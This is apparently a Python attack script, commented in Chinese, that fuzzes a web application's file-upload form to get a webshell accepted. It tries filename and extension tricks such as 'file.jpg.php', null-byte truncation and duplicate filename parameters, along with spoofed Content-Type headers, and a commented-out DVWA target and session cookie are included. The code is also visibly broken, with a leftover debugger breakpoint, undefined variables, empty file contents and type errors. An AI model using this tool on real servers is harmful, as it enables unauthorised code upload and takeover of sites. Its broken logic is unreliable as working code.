import pdb
import re
import urllib.request
import urllib.error
import urllib.parse
import sys
import argparse
from urllib.parse import urlparse
from exp10it import get_request
from exp10it import get_param_part_from_content


def get_form_data_post_info(url, cookie):
    # 获取通过multipart_form_data上传文件的信息
    # return_value['form_data_dict']为multipart form data中的非文件参数字典
    # return_value['form_file_param_name']为multipart form data中的文件参数名
    form_data_dict = {}
    form_file_param_name = ''
    origin_html=''
    return_value = {'form_data_dict': form_data_dict,
                    'form_file_param_name': form_file_param_name,
                    'origin_html':origin_html}
    rsp = get_request(url, cookie=cookie)
    origin_html = rsp['content']
    if not re.search(r"<form\s+", origin_html, re.I):
        print("Sorry,I can't find any form.")
        sys.exit(1)
    param_part = get_param_part_from_content(origin_html)
    param_list = param_part.split("&")
    for param_and_value in param_list:
        _ = param_and_value.split("=")
        param = _[0]
        value = _[1]
        if value != "filevalue":
            # 非文件参数
            form_data_dict[param] = value
        else:
            # 文件参数
            form_file_param_name = param

    return_value['form_data_dict'] = form_data_dict
    return_value['form_file_param_name'] = form_file_param_name
    return_value['origin_html']=origin_html
    return return_value


def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_param_name='', file_content='', filename='', content_type=''):
    # form_file_param_name为表单中的文件参数名
    # file_content为文件内容,string格式
    code = 0
    html = ''
    return_value = {'code': code, 'html': html}
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
               'Referer': '%s' % url,
               'Cookie': '%s' % cookie,
               'Connection': 'close',
               'Upgrade-Insecure-Requests': '1',
               'Content-Type': 'multipart/form-data; boundary=%s' % boundary}

    data = []
    for key in form_data_dict:
        data.append('--%s\r\n' % boundary)
        value = form_data_dict[key]
        data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
        data.append(value + "\r\n")
    if form_file_param_name != "" and file_content != "" and filename != "" and content_type != "":
        data.append('--%s\r\n' % boundary)
        data.append('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' %
                    (form_file_param_name, filename))
        data.append('Content-Type: %s\r\n\r\n' % content_type)
        data.append(file_content + "\r\n")
    data.append('--%s--' % boundary)
    pdb.set_trace()
    data = ''.join(data)
    # proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
    # opener = urllib.request.build_opener(proxy)
    # urllib.request.install_opener(opener)
    req = urllib.request.Request(
        url, headers=headers, data=data.encode("utf-8"))
    with urllib.request.urlopen(req) as response:
        code = response.code
        html = response.read()
    return_value['code'] = code
    return_value['html'] = html
    return return_value


def get_work_file_suffix(url, cookie, form_data_dict, boundary, form_file_param_name, filename, content_type):
    file_suffix_list = ['jpg', 'png', 'gif', 'txt']
    for file_suffix in file_suffix_list:
        filename = "test.%s" % file_suffix
        if file_suffix == 'jpg':
            file_content = jpg_file_content
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content}
        elif file_suffix == 'png':
            file_content = png_file_content
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content}
        elif file_suffix == 'gif':
            file_content = gif_file_content
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content}
        elif file_suffix == 'txt':
            file_content = gif_file_content
            rsp = post_multipart_form_data(
                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
            if rsp['code'] == 200:
                return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': gif_file_content}
    print("正常上传jpg/gif/png/txt全部失败,这个url的上传功能可能存在问题...")
    sys.exit(1)

def check_upload_succeed(rsp,origin_html):
    code=rsp['code']
    html=rsp['html']
    if code!=200:
        return False
    for line in html:
        if not re.match(r"\s+",line) and line not in origin_html:
            print(line)
    input()



def fuzz_upload_webshell():
    # url = 'http://192.168.135.39/dvwa/vulnerabilities/upload/'
    # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
    filename = "file.jpg.php"
    content_type = 'image/jpeg'
    work_file_suffix = get_work_file_suffix(url, cookie, form_data_dict, boundary,
                                            form_file_param_name, filename, content_type)
    fuzz_file_name = [
        {'desc': '修改后缀为webshell后缀',
            'modify': {'filename': 'test.%s' % script_suffix}},
        {'desc': '修改后缀为.jpg;test.php',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '%00截断', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '双文件上传', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '两个filename参数',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '两个filename参数以空格分割',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '两个filename参数以Tab分割',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '两个filename参数以\\r\\n分割',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
    ]
    fuzz_content_type = [
        {'desc': '修改content-type为image/jpeg',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '修改content-type为image/gif',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '修改content-type为image/png',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '修改content-type为text/plain',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
        {'desc': '修改content-type为xxx/xxx',
            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
    ]
    for each in fuzz_file_name:
        filename = each['modify']['filename']
        content_type = work_file_suffix['content_type']
        file_content = work_file_suffix['file_content']
        rsp = post_multipart_form_data(
            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
        check_upload_succeed(rsp,origin_html)


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url")
parser.add_argument("--cookie")
parser.add_argument("--suffix")
args = parser.parse_args()
url = args.url
cookie = args.cookie
script_suffix = args.suffix
gif_file_content = '''GIF89a
somethin'''
jpg_file_content = '''

'''
png_file_content = '''

'''
info = get_form_data_post_info(url, cookie)
form_data_dict = info['form_data_dict']
form_file_param_name = info['form_file_param_name']
origin_html=info['origin_html']
boundary = '-------------------------7df3069603d6'


if __name__ == "__main__":
    fuzz_upload_webshell()
